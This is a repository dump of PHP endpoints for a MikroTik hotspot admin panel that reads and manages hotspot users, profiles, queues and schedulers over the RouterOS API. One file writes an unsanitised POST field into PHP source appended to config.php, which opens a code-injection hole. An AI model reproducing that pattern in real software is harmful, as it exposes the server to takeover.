+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("config/connection.php");
+  
+    $get_hotspot_active = $API->comm("/ip/hotspot/active/print");
+  
+  
+    //   echo json_encode($get_hotspot_active);
+    $json_data = json_encode($get_hotspot_active);
+
+        $d = new jsEncode();
+
+        $json_enc = $d->encodeString($json_data,25);
+        echo $json_enc;
+
+    
+ 	
+}
+ ?>
+
+ 
+
+
+================================================
+FILE: get/get_hotspot_server.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+      $force = $_GET['f'];
+
+      if($force == "false" && isset($_SESSION["$m_user.'hotspot-server'"])){
+          
+              echo $_SESSION["$m_user.'hotspot-server'"];
+      }else if($force == "true" || !isset($_SESSION["$m_user.'hotspot-server'"])){
+          include_once("config/connection.php");
+          
+          
+          $get_hotspot_server = $API->comm("/ip/hotspot/print");
+  
+   
+            // echo json_encode($get_hotspot_server);
+
+            $json_data = json_encode($get_hotspot_server);
+
+              $d = new jsEncode();
+
+              $json_enc = $d->encodeString($json_data,25);
+              echo $json_enc;
+      
+              $_SESSION["$m_user.'hotspot-server'"] = $json_enc;
+      }    
+    
+}
+ ?>
+
+
+================================================
+FILE: get/get_interface.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+
+include_once("config/connection.php");
+  
+    $get_interface = $API->comm("/interface/print");
+
+    	$json_data = json_encode($get_interface);
+
+        $d = new jsEncode();
+
+        $json_enc = $d->encodeString($json_data,25);
+        echo $json_enc;
+    
+    
+ 	
+}
+ ?>
+
+
+================================================
+FILE: get/get_nat.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+
+ 
+
+}else{
+
+
+
+
+include_once("config/connection.php");
+  
+    $get_hots_active = $API->comm("/ip/firewall/nat/print");
+  
+  
+      echo json_encode($get_hots_active);
+    // $json_data = json_encode($get_hots_active);
+
+    //     $d = new jsEncode();
+
+    //     $json_enc = $d->encodeString($json_data,25);
+    //     echo $json_enc;
+
+    
+    
+}
+ ?>
+
+ 
+
+
+================================================
+FILE: get/get_parent_queue.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+
+$force = $_GET['f'];
+
+      if($force == "false" && isset($_SESSION["$m_user.'parentq'"])){
+          
+              echo $_SESSION["$m_user.'parentq'"];
+      }else if($force == "true" || !isset($_SESSION["$m_user.'parentq'"])){
+            include_once("config/connection.php");
+
+
+            $get_allqueue = $API->comm("/queue/simple/print", array(
+                "?dynamic" => "false",
+            ));
+
+            echo json_encode($get_allqueue);
+            $_SESSION["$m_user.'parentq'"] = json_encode($get_allqueue);
+
+
+        }
+
+    	
+}
+ ?>
+
+
+================================================
+FILE: get/get_profile.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+$upid = $_GET['id'];
+$upname = $_GET['name'];
+
+include_once("config/connection.php");
+
+if(!empty($upid)){
+  
+    $get_uprofile = $API->comm("/ip/hotspot/user/profile/print", array("?.id" => "$upid"));
+}else if(!empty($upname)){
+	$get_uprofile = $API->comm("/ip/hotspot/user/profile/print", array("?name" => "$upname"));
+}
+      echo json_encode($get_uprofile);
+    //   $json_data = json_encode($get_users);
+
+    //           $d = new jsEncode();
+
+    //           $json_enc = $d->encodeString($json_data,25);
+    //           echo $json_enc;
+    	
+}
+ ?>
+
+
+================================================
+FILE: get/get_profiles.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+      $force = $_GET['f'];
+
+      if($force == "false" && isset($_SESSION["$m_user.'profiles'"])){
+          
+              echo $_SESSION["$m_user.'profiles'"];
+      }else if($force == "true" || !isset($_SESSION["$m_user.'profiles'"])){
+          include_once("config/connection.php");
+          
+          
+          $get_user_profiles = $API->comm("/ip/hotspot/user/profile/print");
+  
+   
+            // echo json_encode($get_user_profiles);
+
+            $json_data = json_encode($get_user_profiles);
+
+              $d = new jsEncode();
+
+              $json_enc = $d->encodeString($json_data,25);
+              echo $json_enc;
+      
+              $_SESSION["$m_user.'profiles'"] = $json_enc;
+      }    
+    
+}
+ ?>
+
+
+================================================
+FILE: get/get_report.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+$day = $_GET['day'];
+$force = $_GET['f'];
+$sessR = $m_user."report".$day;
+
+$today = strtolower(date('M/d/Y'));
+
+    if($today == $day){
+        include_once("config/connection.php");
+      
+        
+      
+        $get_report = $API->comm("/system/script/print", array(
+          "?source" => "$day",
+        ));
+        // echo json_encode($get_report);
+
+        $json_data = json_encode($get_report);
+
+            $d = new jsEncode();
+
+            $json_enc = $d->encodeString($json_data,25);
+            echo $json_enc;
+
+        $_SESSION["$sessR"] = $json_enc;
+      } else if($today != $day){
+        if($force == "false" && isset($_SESSION["$sessR"])){
+            
+          echo $_SESSION["$sessR"];
+          
+        }else if($force == "true" || !isset($_SESSION["$sessR"]) || empty($_SESSION["$sessR"])){
+        include_once("config/connection.php");
+        
+          $get_tot_report = $API->comm("/system/script/print", array("?source" => "$day","count-only" => ""));
+       
+          if($get_tot_report != $_SESSION["$sessR.'tot'"]){
+        
+            $get_report = $API->comm("/system/script/print", array(
+              "?source" => "$day",
+            ));
+            // echo json_encode($get_report);
+
+            $json_data = json_encode($get_report);
+
+              $d = new jsEncode();
+
+              $json_enc = $d->encodeString($json_data,25);
+              echo $json_enc;
+    
+            $_SESSION["$sessR"] = $json_enc;
+            $_SESSION["$sessR.'tot'"] = $get_tot_report;
+          }else{
+            echo $_SESSION["$sessR"];
+          }
+
+        }
+    
+}   
+    
+}
+ ?>
+
+
+================================================
+FILE: get/get_tot_users.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+$uname = $_GET['name'];
+
+include_once("config/connection.php");
+  
+    $get_tot_users = $API->comm("/ip/hotspot/user/print", array("count-only" => "",));
+  
+  	$tot_users = array(
+          "users" => $get_tot_users -1
+      );
+      echo json_encode($tot_users);
+      
+ 	
+}
+ ?>
+
+
+================================================
+FILE: get/get_traffic.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+$iface = $_GET['iface'];
+
+include_once("config/connection.php");
+  
+  $get_interfacetraffic = $API->comm("/interface/monitor-traffic", array(
+        "interface" => "$iface",
+        "once" => "",
+        ));
+  
+      $rows = array(); $rows2 = array();
+  
+      $ftx = $get_interfacetraffic[0]['tx-bits-per-second'];
+      $frx = $get_interfacetraffic[0]['rx-bits-per-second'];
+  
+        $rows['name'] = 'Tx';
+        $rows['data'][] = $ftx;
+        $rows2['name'] = 'Rx';
+        $rows2['data'][] = $frx;
+        
+
+    $result = array();
+  
+      array_push($result,$rows);
+      array_push($result,$rows2);
+      echo json_encode($result);
+    
+
+}
+ ?>
+
+
+================================================
+FILE: get/get_user.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+include_once("../core/func.php");
+$uid = $_GET['id'];
+$uname = $_GET['name'];
+
+include_once("config/connection.php");
+
+if(!empty($uid)){
+  
+    $get_users = $API->comm("/ip/hotspot/user/print", array("?.id" => "$uid"));
+}else if(!empty($uname)){
+	$get_users = $API->comm("/ip/hotspot/user/print", array("?name" => "$uname"));
+}
+      // echo json_encode($get_users);
+      $json_data = json_encode($get_users);
+
+              $d = new jsEncode();
+
+              $json_enc = $d->encodeString($json_data,25);
+              echo $json_enc;
+    	
+}
+ ?>
+
+
+================================================
+FILE: get/get_users.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+// protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    include_once("../core/route.php");
+}else{
+
+$uprof = $_GET['prof'];
+$force = $_GET['f'];
+$cache = $_GET['c'];
+$x = "#";
+    if($force == "false" && isset($_SESSION["$m_user.$uprof"])){
+        
+            
+            if(isset($cache)){
+                echo $_SESSION["$m_user.$uprof.$x"];
+            }else{
+                echo $_SESSION["$m_user.$uprof"];
+            }
+    }else if($force == "true" || !isset($_SESSION["$m_user.$uprof"]) || empty($_SESSION["$m_user.$uprof"])){
+        include_once("config/connection.php");
+
+            $get_users = $API->comm("/ip/hotspot/user/print", array("?profile" => "$uprof"));
+            
+            $json_data = json_encode($get_users);
+
+            $d = new jsEncode();
+
+            $json_enc = $d->encodeString($json_data,25);
+            
+                if(isset($cache)){
+                    echo count($get_users);
+                }else{
+                    echo $json_enc;
+                }
+
+            $_SESSION["$m_user.$uprof"] = $json_enc;
+            $_SESSION["$m_user.$uprof.$x"] = count($get_users);
+
+    }
+}
+ ?>
+
+
+================================================
+FILE: get/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../core/route.php");
+e403();
+
+
+================================================
+FILE: post/index.php
+================================================
+<?php
+include_once("../core/page_route.php");
+include_once("../core/route.php");
+e403();
+
+
+================================================
+FILE: post/post_a_router.php
+================================================
+<?php
+
+session_start();
+// hide all error
+// error_reporting(0);
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+include_once("../core/routeros_api.class.php");
+
+if (isset($_POST['router_']) && isset($_SESSION["mikhmon"])) {
+	$do = $_POST['do'];
+	$config_file = "../config/config.php";
+	$router = $_POST['router_'];
+	if ($do == "add" && explode("_", $router)[0] == "sess") {
+		$router = str_replace("sess_", "session", $router . rand(100, 999));
+		$data = '$data';
+		$f = fopen('../config/config.php', 'a');
+		fwrite($f, "\n'$'data['" . $router . "'] = array ('1'=>'" . $router . "!','" . $router . "@|@','" . $router . "#|#','" . $router . "%','" . $router . "^','" . $router . "&Rp','" . $router . "*','" . $router . "(','" . $router . ")','" . $router . "=30','" . $router . "@!@disable','" . $router . "#!#');");
+		if (false === $f) {
+			$mess = array(
+				"message" => "Error, cannot write config file, please check folder or file permissions."
+			);
+			echo json_encode($mess);
+		} else {
+
+			fclose($f);
+			$search = "'$'data";
+			$replace = (string)"$data";
+			$file = file($config_file);
+			$content = file_get_contents($config_file);
+			$newcontent = str_replace((string)$search, (string)$replace, "$content");
+			$storenewcontent = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $newcontent);
+			file_put_contents($config_file, "$storenewcontent");
+
+
+			$mess = array(
+				"message" => "Success",
+				"sesname" => $router
+			);
+			echo json_encode($mess);
+		}
+	} else if ($do == "remove") {
+		$session = $_POST['router_']; // Tambahkan baris ini
+		$fc = file($config_file);
+		$f = fopen($config_file, "w");
+		$q = "'";
+		if (false === $f) {
+			$mess->message = "Error, cannot write config file, please check folder or file permissions.";
+			echo json_encode($mess);
+		} else {
+			$rem = '$data[' . $q . $router . $q . ']';
+			foreach ($fc as $line) {
+				if (!strstr($line, $rem))
+					fputs($f, $line);
+			}
+			fclose($f);
+			$logo_file = "../assets/img/logo-" . $session . ".png";
+			if (file_exists($logo_file)) {
+				unlink($logo_file);
+			}
+
+			$mess = array(
+				"message" => "Success"
+			);
+			echo json_encode($mess);
+		}
+	} else if ($do == "save") {
+		$session = $_POST['router_'];
+		$sesname = str_replace(" ", "", preg_replace("/[^a-zA-Z0-9]/", "", $_POST['session']));
+
+		// Inisialisasi sesnamer agar tidak undefined
+		$sesnamer = "";
+
+		if (is_file($config_file) && !is_writable($config_file)) {
+			$mess->message = "Error, cannot write config file, please check folder or file permissions.";
+			$mess->sess = "__err_";
+			echo json_encode($mess);
+		} else if (is_file($config_file) && is_writable($config_file)) {
+			foreach (file('../config/config.php', FILE_SKIP_EMPTY_LINES) as $line) {
+				$parts = explode("'", $line);
+				$ss = isset($parts[1]) ? $parts[1] : '';
+
+				if (($ss == $sesname && $sesname !== $session)) {
+					$sesnamer = rand(100, 999); // Definisikan di sini
+					$mess = array(
+						"message" => "Session name [" . $sesname . "] already exists,\nwill be renamed to [" . $sesname . $sesnamer . "].",
+						"sess" => $sesname . $sesnamer
+					);
+					echo json_encode($mess);
+				} else if ($ss == $session) {
+
+					$iphost = get_config($line, $session . '!', "'");
+					$userhost = get_config($line, $session . '@|@', "'");
+					$passwdhost = get_config($line, $session . '#|#', "'");
+					$hotspotname = get_config($line, $session . '%', "'");
+					$dnsname = get_config($line, $session . '^', "'");
+					$currency = get_config($line, $session . '&', "'");
+					$phone = get_config($line, $session . '*', "'");
+					$email = get_config($line, $session . '(', "'");
+					$infolp = get_config($line, $session . ')', "'");
+					$idleto = get_config($line, $session . '=', "'");
+					$report = get_config($line, $session . '@!@', "'");
+					$token = get_config($line, $session . '#!#', "'");
+
+					$siphost = preg_replace('/\s+/', '', decode($_POST['ipmik'] ?? ''));
+					$suserhost = decode($_POST['usermik'] ?? '');
+					$spasswdhost = enc_rypt(decode($_POST['passmik'] ?? ''));
+					$shotspotname = str_replace("'", "", $_POST['hotspotname'] ?? '');
+					$sdnsname = $_POST['dnsname'] ?? '';
+					$scurrency = $_POST['currency'] ?? '';
+					$semail = decode($_POST['email'] ?? '');
+					$sinfolp = $_POST['infolp'] ?? '';
+					$sinfobin = $sinfolp ? implode(unpack("H*", $sinfolp)) : '';
+					$sidleto = $_POST['idleto'] ?? '';
+					$sphone = decode($_POST['phone'] ?? '');
+					$sreport = $_POST['report'] ?? '';
+					$stoken = "";
+
+					// Pastikan sesname digunakan dengan benar
+					$new_sesname = str_replace(' ', '', preg_replace("/[^a-zA-Z0-9]/", "", $_POST['session'] ?? '')) . ($sesnamer ?: '');
+
+					$search = array(
+						"$session!$iphost",
+						"$session@|@$userhost",
+						"$session#|#$passwdhost",
+						"$session%$hotspotname",
+						"$session^$dnsname",
+						"$session&$currency",
+						"$session*$phone",
+						"$session($email",
+						"$session)$infolp",
+						"$session=$idleto",
+						"'$session'",
+						"$session@!@$report",
+						"$session#!#$token"
+					);
+
+					$replace = array(
+						"$new_sesname!$siphost",
+						"$new_sesname@|@$suserhost",
+						"$new_sesname#|#$spasswdhost",
+						"$new_sesname%$shotspotname",
+						"$new_sesname^$sdnsname",
+						"$new_sesname&$scurrency",
+						"$new_sesname*$sphone",
+						"$new_sesname($semail",
+						"$new_sesname)$sinfobin",
+						"$new_sesname=$sidleto",
+						"'$new_sesname'",
+						"$new_sesname@!@$sreport",
+						"$new_sesname#!#$stoken"
+					);
+
+					for ($i = 0; $i < count($search); $i++) {
+						$content = file_get_contents($config_file);
+						$newcontent = str_replace((string)$search[$i], (string)$replace[$i], $content);
+						file_put_contents($config_file, $newcontent);
+					}
+
+					// Rename logo jika file ada
+					$old_logo = "../assets/img/logo-" . $session . ".png";
+					$new_logo = "../assets/img/logo-" . $new_sesname . ".png";
+
+					if (file_exists($old_logo)) {
+						rename($old_logo, $new_logo);
+					}
+
+					if ($sesnamer === "") {
+						$mess = array(
+							"message" => "Success",
+							"sess" => $new_sesname
+						);
+						echo json_encode($mess);
+					}
+				}
+			}
+		}
+	} else if ($do == "saveAdmin") {
+
+		$suseradm = str_replace("'", '', decode($_POST['username']));
+		$spassadm = enc_rypt(decode($_POST['password']));
+		if (is_file($config_file) && !is_writable($config_file)) {
+			$mess->message = "Error, cannot write config file, please check folder or file permissions.";
+			echo json_encode($mess);
+		} else if (is_file($config_file) && is_writable($config_file)) {
+			foreach (file('../config/config.php', FILE_SKIP_EMPTY_LINES) as $line) {
+				$parts = explode("'", $line);
+				$ss = isset($parts[1]) ? $parts[1] : '';
+				$useradm = get_config($line, 'mikhmon<|<', "'");
+				$passadm = get_config($line, 'mikhmon>|>', "'");
+
+				if ($ss == "mikhmon") {
+
+					$cari = array('1' => "mikhmon<|<$useradm", "mikhmon>|>$passadm");
+					$ganti = array('1' => "mikhmon<|<$suseradm", "mikhmon>|>$spassadm");
+
+					for ($i = 1; $i < 3; $i++) {
+						$file = file($config_file);
+						$content = file_get_contents($config_file);
+						$newcontent = str_replace((string)$cari[$i], (string)$ganti[$i], "$content");
+						file_put_contents($config_file, "$newcontent");
+					}
+
+					$mess = array(
+						"message" => "Success"
+					);
+					echo json_encode($mess);
+				}
+			}
+		}
+	}
+} else {
+	// protect .php
+	$get_self = explode("/", $_SERVER['PHP_SELF']);
+	$self[] = $get_self[count($get_self) - 1];
+
+	if ($self[0] !== "index.php"  && $self[0] !== "") {
+		include_once("../core/page_route.php");
+		include_once("../core/route.php");
+	}
+}
+// }
+
+
+================================================
+FILE: post/post_add_user.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+
+if(isset($_POST['name']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+	$server = $_POST['server'];
+	$name = $_POST['name'];
+	$password = $_POST['password'];
+	$profile = $_POST['profile'];
+	$mac_addr = $_POST['macaddr'];
+	$timelimit = $_POST['timelimit'];
+	$datalimit = $_POST['datalimit'];
+	$comment = $_POST['comment'];
+
+	if($name == $password){
+		$comment = "vc-".$comment;
+	}else{
+		$comment = "up-".$comment;
+	}
+
+	
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+ 
+	$add = $API->comm("/ip/hotspot/user/add", array(
+	  "server" => "$server",
+      "name" => "$name",
+      "password" => "$password",
+      "profile" => "$profile",
+      "mac-address" => "$mac_addr",
+      "disabled" => "no",
+      "limit-uptime" => "$timelimit",
+      "limit-bytes-total" => "$datalimit",
+      "comment" => "$comment",
+    ));
+
+	
+	
+    
+    if(!empty($add['!trap'][0]['message'])){
+		$message = $add['!trap'][0]['message'];
+		$mess = array(
+			"message" => "error",
+			"data" => array("error" => $message)
+		  );
+		echo json_encode($mess);
+	}else if(substr($add, 0,1) == "*"){
+    	$getuser = $API->comm("/ip/hotspot/user/print", array(
+	      "?.id" => "$add",
+	    ));
+	 
+		$mess = array(
+			"message" => "success",
+			"data" => $getuser[0]
+		  );
+		echo json_encode($mess);
+	}
+	
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+	include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_add_userprofile.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+
+if(isset($_POST['name']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+
+    $name = (preg_replace('/\s+/', '-',$_POST['name']));
+        $sharedusers = ($_POST['sharedusers']);
+        $ratelimit = ($_POST['ratelimit']);
+        $expmode = ($_POST['expmode']);
+        $validity = strtolower($_POST['validity']);
+        $getprice = ($_POST['price']);
+        $getsprice = ($_POST['sellingprice']);
+        $addrpool = ($_POST['addresspool']);
+        if ($getprice == "") {
+          $price = "0";
+        } else {
+          $price = $getprice;
+        }
+        if ($getsprice == "") {
+          $sprice = "0";
+        } else {
+          $sprice = $getsprice;
+        }
+        $getlock = ($_POST['lockuser']);
+        if ($getlock == "Enable") {
+          $lock = '; [:local mac $"mac-address"; /ip hotspot user set mac-address=$mac [find where name=$user]]';
+        } else {
+          $lock = "";
+        }
+
+        $srvlock = ($_POST['lockserver']);
+        if ($srvlock == "Disable") {
+          $slock = "";
+        } else if ($srvlock !== "Disable") {
+          $slock = '; [:local mac $"mac-address"; :local srv [/ip hotspot host get [find where mac-address="$mac"] server]; /ip hotspot user set server=$srv [find where name=$user]]';
+        }
+          
+        $parent = ($_POST['parentqueue']);
+
+        if ($expmode == "ntf" || $expmode == "ntfc") {
+          $mode = "N";
+        }else if ($expmode == "rem" || $expmode == "remc") {
+          $mode = "X";
+        }
+        
+        $record = '; :local mac $"mac-address"; :local time [/system clock get time ]; /system script add name="$date-|-$time-|-$user-|-'.$price.'-|-$address-|-$mac-|-' . $validity . '-|-'.$name.'-|-$comment" owner="$month$year" source=$date comment=mikhmon';
+        
+        $onlogin = ':put (",'.$expmode.',' . $price . ',' . $validity . ','.$sprice.',,' . $getlock . ',' . $srvlock . ',"); :local mode "'.$mode.'"; {:local date [ /system clock get date ];:local year [ :pick $date 7 11 ];:local month [ :pick $date 0 3 ];:local comment [ /ip hotspot user get [/ip hotspot user find where name="$user"] comment]; :local ucode [:pic $comment 0 2]; :if ($ucode = "vc" or $ucode = "up" or $comment = "") do={ /sys sch add name="$user" disable=no start-date=$date interval="' . $validity . '"; :delay 2s; :local exp [ /sys sch get [ /sys sch find where name="$user" ] next-run]; :local getxp [len $exp]; :if ($getxp = 15) do={ :local d [:pic $exp 0 6]; :local t [:pic $exp 7 16]; :local s ("/"); :local exp ("$d$s$year $t"); /ip hotspot user set comment="$exp $mode" [find where name="$user"];}; :if ($getxp = 8) do={ /ip hotspot user set comment="$date $exp $mode" [find where name="$user"];}; :if ($getxp > 15) do={ /ip hotspot user set comment="$exp $mode" [find where name="$user"];}; /sys sch remove [find where name="$user"]';
+        
+    
+        if ($expmode == "rem") {
+          $onlogin = $onlogin . $lock . $slock ."}}";
+        } elseif ($expmode == "ntf") {
+          $onlogin = $onlogin . $lock . $slock ."}}";
+        } elseif ($expmode == "remc") {
+          $onlogin = $onlogin . $record . $lock . $slock ."}}";
+        } elseif ($expmode == "ntfc") {
+          $onlogin = $onlogin . $record . $lock . $slock ."}}";
+        } elseif ($expmode == "0" && $price != "") {
+          $onlogin = ':put (",,' . $price . ',,'.$sprice.',noexp,' . $getlock . ','.$srvlock.',")' . $lock . $slock;
+        } else {
+          $onlogin = "";
+        }
+
+	
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+
+       
+	$add = $API->comm("/ip/hotspot/user/profile/add", array(
+
+      "name" => "$name",
+      "address-pool" => "$addrpool",
+      "rate-limit" => "$ratelimit",
+      "shared-users" => "$sharedusers",
+      "status-autorefresh" => "1m",
+      "on-login" => "$onlogin",
+      "parent-queue" => "$parent",
+    ));
+
+	
+	
+    
+    if(!empty($add['!trap'][0]['message'])){
+		$message = $add['!trap'][0]['message'];
+		$mess = array(
+			"message" => "error",
+			"data" => array("error" => $message)
+		  );
+		echo json_encode($mess);
+	}else if(substr($add, 0,1) == "*"){
+    	$getuser = $API->comm("/ip/hotspot/user/profile/print", array(
+	      "?.id" => "$add",
+	    ));
+	 
+		$mess = array(
+			"message" => "success",
+			"data" => $getuser[0]
+		  );
+		echo json_encode($mess);
+	}
+	
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+  include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+================================================
+FILE: post/post_cache_voucher.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+
+if(isset($_POST['qty']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+
+		$user = ($_POST['user']);
+
+		$gcomment = ($_POST['gcomment']);
+        $gencode = ($_POST['gencode']);
+
+		if ($gcomment == "") {
+			$gcomment = "";
+		} else {
+			$gcomment = $gcomment;
+		}
+
+		
+		$commt = $user . "-" . $gencode . "-" . date("m.d.y") . "-" . $gcomment;
+		$_SESSION[$m_user.$commt."_c"] = $commt;
+        
+           // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+    
+	$get_hotspotusers = $API->comm("/ip/hotspot/user/print", array("?comment"=> "$commt", "?uptime" => "0s"));  
+	$_SESSION[$m_user.$commt] = $get_hotspotusers;
+	$totgen = count($get_hotspotusers);
+    
+    if(!empty($get_hotspotusers['!trap'][0]['message'])){
+		$message = $get_hotspotusers['!trap'][0]['message'];
+		$mess = array(
+			"message" => "error",
+			"data" => array("error" => $message)
+		  );
+		echo json_encode($mess);
+	}else{
+ 
+		$mess = array(
+			"message" => "success",
+			"data" => array("count"=>"$totgen","comment"=>"$commt")
+		  );
+		echo json_encode($mess);
+	}
+	
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+    // include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
+// }
+   
+?>
+
+
+
+
+
+
+
+================================================
+FILE: post/post_expire_monitor.php
+================================================
+<?php
+
+session_start();
+// hide all error
+error_reporting(0);
+include_once("../core/page_route.php");
+include_once("../core/no_cache.php");
+
+
+if(isset($_POST['sessname']) && isset($_SESSION["mikhmon"])){
+
+	$m_user = explode("?",$_POST['sessname'])[1];
+
+	$expire_monitor_src = $_POST['expmon'];
+
+    // routeros api
+    include_once('../core/routeros_api.class.php');
+
+    include_once("../config/config.php");
+    // read config
+
+    $iphost = explode('!', $data[$m_user][1])[1];
+    $userhost = explode('@|@', $data[$m_user][2])[1];
+    $passwdhost = explode('#|#', $data[$m_user][3])[1];
+
+    $API = new RouterosAPI();
+    $API->debug = false;
+
+    $API->connect($iphost, $userhost, dec_rypt($passwdhost));
+
+  	$get_expire_mon = $API->comm("/system/scheduler/print", array(
+            "?name" => "Mikhmon-Expire-Monitor",));
+
+    if($get_expire_mon[0]['name'] !== "Mikhmon-Expire-Monitor"){
+      $expmon = $API->comm("/system/scheduler/add", array(
+        "name" => "Mikhmon-Expire-Monitor",
+        "start-time" => "00:00:00",
+        "interval" => "00:01:00",
+        "on-event" => "$expire_monitor_src",
+        "disabled" => "no",
+        "comment" => "Mikhmon Expire Monitor",
+        ));
+      if(substr($expmon, 0,1) == "*"){
+        $mess = array(
+          "message" => "success"
+        );
+        echo json_encode($mess);
+      }
+    }else if($get_expire_mon[0]['disabled'] == "true"){
+      $id = $get_expire_mon[0]['.id'];
+      $expmon = $API->comm("/system/scheduler/set", array(
+        ".id" => "$id",
+        "interval" => "00:01:00",
+        "on-event" => "$expire_monitor_src",
+        "disabled" => "no",
+        ));
+      
+        $mess = array(
+          "message" => "success"
+        );
+        
+        echo json_encode($mess);
+      
+    }else{
+      $message = $get_expire_mon[0]['name'];
+     
+      $mess = array(
+        "message" => $message
+      );
+      echo json_encode($mess);
+    }
+	   
+
+}else{
+    // protect .php
+$get_self = explode("/",$_SERVER['PHP_SELF']);
+$self[] = $get_self[count($get_self)-1];
+
+if($self[0] !== "index.php"  && $self[0] !==""){
+  include_once("../core/page_route.php");
+    include_once("../core/route.php");
+
+ }
+}
